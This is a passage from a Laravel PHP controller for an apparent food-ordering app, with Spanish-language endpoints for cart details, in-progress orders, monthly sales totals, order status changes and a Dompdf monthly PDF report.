                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    public function MostrarPedidosCreadosDetalle(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            if (! $user->count()) {
                return response()->json(['mensaje' => 'No autorizado'], 404);
            }

            $request->validate([
                'id_carrito_compras' => ['required', 'numeric', Rule::exists('detalle_carritos', 'id_carrito_compras')],
            ]);

            $detalleCarrito = detalleCarrito::select('detalle_carritos.*', 'productos.descripcion', 'productos.ruta_imagen')
                ->join('productos', 'productos.id', '=', 'detalle_carritos.id_productos')
                ->where('detalle_carritos.id_carrito_compras', $request->input('id_carrito_compras'))
                ->get();

            $detalleCarritoContar = detalleCarrito::where('id_carrito_compras', $request->input('id_carrito_compras'))->count();
            if ($detalleCarritoContar == 0) {
                return response()->json(['mensaje' => 'Carrito Vacio'], 404);
            }

            $data = [];

            foreach ($detalleCarrito as $detalle) {
                $path = storage_path('app/'.$detalle->ruta_imagen);
                $file = File::get($path);
                $type = File::mimeType($path);

                $producto = [
                    'id' => $detalle->id,
                    'cantidad' => $detalle->cantidad,
                    'descripcion' => $detalle->descripcion,
                    'total' => $detalle->total,
                    'extra_queso' => $detalle->extra_queso,
                    'extra_jamon' => $detalle->extra_jamon,
                    'extra_peperoni' => $detalle->extra_peperoni,
                    'ruta_imagen' => base64_encode($file),
                    'tipo_imagen' => $type,
                ];

                array_push($data, $producto);
            }

            return response()->json([
                'mensaje' => 'Pedido cargado',
                'data' => $data,
            ]);

        } catch (FileNotFoundException $e) {
            // Manejar la excepción aquí
            return response()->json(['mensaje' => 'El archivo no existe'], 404);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    public function MostrarPedidosEnProceso(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            if (! $user->count()) {
                return response()->json(['mensaje' => 'No autorizado'], 404);
            }

            $cabeceraPedidos = pedido_encabezado::where('status_pedido', 'EN-PROCESO')
                ->orWhere('status_pedido', 'EN PROCESO')
                ->orWhere('status_pedido', 'ENVIADO')
                ->get();
            if (! $cabeceraPedidos->count()) {
                return response()->json(['mensaje' => 'No hay elementos'], 404);
            }

            return response()->json([
                'mensaje' => 'Pedido cargado',
                'data' => $cabeceraPedidos,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function MostrarResultadosProducto(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            if (! $user->count()) {
                return response()->json(['mensaje' => 'No Autorizado'], 404);
            }
            $mesActual = Carbon::now()->month;
            $añoActual = Carbon::now()->year;

            $detalleCarrito = pedido_encabezado::select('productos.id_tiposproducto', 'productos.descripcion', pedido_encabezado::raw('SUM(detalle_carritos.total) as total_por_tipo'))
                ->join('detalle_carritos', 'pedido_encabezados.id_carrito', '=', 'detalle_carritos.id_carrito_compras')
                ->join('productos', 'detalle_carritos.id_productos', '=', 'productos.id')
                ->whereMonth('pedido_encabezados.created_at', $mesActual)
                ->whereYear('pedido_encabezados.created_at', $añoActual)
                ->groupBy('productos.id_tiposproducto', 'productos.descripcion')
                ->get();

            if (! $detalleCarrito->count()) {
                return response()->json(['mensaje' => 'No hay elementos'], 404);
            }

            return response()->json([
                'mensaje' => 'Pedido cargado',
                'data' => $detalleCarrito,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function MostrarResultadosProductoMensual(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            if (! $user->count()) {
                return response()->json(['mensaje' => 'No Autorizado'], 404);
            }
            $mesActual = Carbon::now()->month;
            $añoActual = Carbon::now()->year;

            $detalleCarrito = pedido_encabezado::select('productos.id', 'productos.descripcion', pedido_encabezado::raw('SUM(detalle_carritos.total) as total_por_producto'))
                ->join('detalle_carritos', 'pedido_encabezados.id_carrito', '=', 'detalle_carritos.id_carrito_compras')
                ->join('productos', 'detalle_carritos.id_productos', '=', 'productos.id')
                ->whereMonth('pedido_encabezados.created_at', $mesActual)
                ->whereYear('pedido_encabezados.created_at', $añoActual)
                ->groupBy('productos.id', 'productos.descripcion')
                ->get();

            if (! $detalleCarrito->count()) {
                return response()->json(['mensaje' => 'No hay elementos'], 404);
            }

            return response()->json([
                'mensaje' => 'Pedido cargado',
                'data' => $detalleCarrito,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function CambioStatusPedido(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            if (! $user->count()) {
                return response()->json(['mensaje' => 'No Autorizado'], 404);
            }
            $request->validate([
                'id' => ['required', 'numeric'],
                'status_pedido' => ['nullable', 'string', 'min:2'],
            ]);

            $cabeceraPedidoupdate = pedido_encabezado::findOrFail($request->input('id'));

            if (! $cabeceraPedidoupdate->count()) {
                return response()->json(['mensaje' => 'NO HAY PEDIDOS'], 404);
            }

            if (! empty($request->input('status_pedido'))) {
                $cabeceraPedidoupdate->status_pedido = $request->input('status_pedido');
            }

            $cabeceraPedidoupdate->save();

            return response()->json([
                'mensaje' => 'pedido cargado',
                'data' => $cabeceraPedidoupdate,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    public function MostrarResultadosProductoMensualPDF(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            if (! $user) {
                return response()->json(['mensaje' => 'No Autorizado'], 404);
            }

            $mesActual = Carbon::now()->month;
            $añoActual = Carbon::now()->year;

            $detalleCarrito = pedido_encabezado::select('productos.id', 'productos.descripcion', pedido_encabezado::raw('SUM(detalle_carritos.total) as total_por_producto'))
                ->join('detalle_carritos', 'pedido_encabezados.id_carrito', '=', 'detalle_carritos.id_carrito_compras')
                ->join('productos', 'detalle_carritos.id_productos', '=', 'productos.id')
                ->whereMonth('pedido_encabezados.created_at', $mesActual)
                ->whereYear('pedido_encabezados.created_at', $añoActual)
                ->groupBy('productos.descripcion', 'productos.id')
                ->get();

            if ($detalleCarrito->isEmpty()) {
                return response()->json(['mensaje' => 'No hay elementos'], 404);
            }

            $html = '<html><body>';
            $html .= '<div class="container">';
            $html .= '<h1 class="text-center">REPORTE MENSUAL</h1>';

            $html .= '<h2 class="text-center">REPORTE POR TIPO DE PRODUCTO</h2>';
            $html .= '<table class="table mx-auto">';
            $html .= '<thead><tr><th class="text-center">ID TIPO PRODUCTO</th><th class="text-center">DESCRIPCION GRUPO</th><th class="text-center">TOTAL POR TIPO DE PRODUCTO</th></tr></thead>';
            $html .= '<tbody>';
            foreach ($detalleCarrito as $producto) {
                $html .= '<tr>';
                $html .= '<td class="text-center">'.$producto->id.'</td>';
                $html .= '<td class="text-center">'.$producto->descripcion.'</td>';
                $html .= '<td class="text-center">'.$producto->total_por_producto.'</td>';
                $html .= '</tr>';
            }
            $html .= '</tbody>';
            $html .= '</table>';

            $html .= '</div>';
            $html .= '</body></html>';

            // Crear una instancia de Dompdf
            $dompdf = new Dompdf();

            // Cargar los datos en HTML para el PDF
            $dompdf->loadHtml($html);

            // Renderizar el PDF
            $dompdf->render();

            // Obtener el contenido del PDF generado
            $pdfContent = $dompdf->output();

            // Generar el nombre del archivo PDF
            $fileName = 'resultados_producto_mensual.pdf';

            // Guardar el contenido del PDF en un archivo local
            file_put_contents($fileName, $pdfContent);

            // Descargar el archivo PDF
            return response()->download($fileName)->deleteFileAfterSend(true);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
/*
     public function SolicitaPedido()
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            $cabeceraCarrito = carritoCompras::where('id_usuario', $user->id)->first(); // Busca la cabecera del carrito para el usuario autenticado
            if (! $cabeceraCarrito) {
                return response()->json(['mensaje' => 'CARRITO DE COMPRA VACIO'], 404);
            }
            if ($cabeceraCarrito->total == 0) {
                return response()->json(['mensaje' => 'CARRITO DE COMPRA VACIO'], 404);
            }

            $cabeceraCarritoSolicitud = carritoCompras::select('carrito_compras.*', 'direcciones.*', 'telefonos.*')
                ->join('direcciones', 'carrito_compras.id_direccion', '=', 'direcciones.id')
                ->join('telefonos', 'carrito_compras.id_telefono', '=', 'telefonos.id')
                ->where('carrito_compras.id', $cabeceraCarrito->id)
                ->get();

            if ($cabeceraCarritoSolicitud->isEmpty()) {
                return response()->json(['mensaje' => 'CARRITO DE COMPRA VACIO'], 404);
            }

            $data = [];

            foreach ($cabeceraCarritoSolicitud as $carrito) {
                $carritoCompra = [
                    'id_usuario' => $carrito->id_usuario,
                    'id_carrito' => $carrito->id_carrito,
                    'total' => $carrito->total,
                    'status_pedido' => 'SOLICITUD-PEDIDO',
                    'nomenclatura' => $carrito->id_direccion,
                ];

                array_push($data, $carritoCompra);
            }

            return response()->json([
                'mensaje' => 'Detalle Carrito Compras',
                'data' => $data,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }
*/
}
